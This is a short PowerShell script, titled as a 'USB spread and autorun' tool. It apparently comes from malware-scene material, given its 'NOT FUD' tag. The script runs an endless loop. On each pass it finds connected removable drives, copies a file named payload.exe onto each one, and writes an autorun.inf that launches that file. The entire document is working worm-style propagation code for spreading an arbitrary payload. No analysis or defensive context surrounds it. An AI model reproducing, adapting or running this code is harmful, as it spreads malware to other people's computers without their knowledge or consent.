# USB Spread and autorun (2022 - NOT FUD)
# list connected USB drives

Function Get-ConnectedUSBDrives {
    Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
}
 
Function Copy-File {
    param (
        [String]$source,
        [String]$destination
    )
    Copy-Item -Path $source -Destination $destination
}

Function Create-AutorunFile {
    param (
        [String]$drive,
        [String]$filename
    )
    # This function would create an autorun.inf file on the drive
    $autorunContent = "[autorun]`nopen=$filename`naction=Run script"
    $autorunContent | Out-File -FilePath "$drive\autorun.inf"
}

Function Main {
    While ($true) {
        # Scan for connected USB drives
        $drives = Get-ConnectedUSBDrives #CallPreviousFunction

        ForEach ($drive in $drives) {
            # Check if the script is already on the drive
            $scriptPath = $drive.DeviceID + "\payload.exe"
            If (-Not (Test-Path $scriptPath)) {
                # Copy the script to the drive
                Copy-File "payload.exe" $scriptPath               
                Create-AutorunFile $drive.DeviceID "payload.exe"
            }
        }

        # Wait some time before scanning again
        Start-Sleep -Milliseconds 60000 # Sleep for 1 minute
    }
}

# Start the Main function
Main
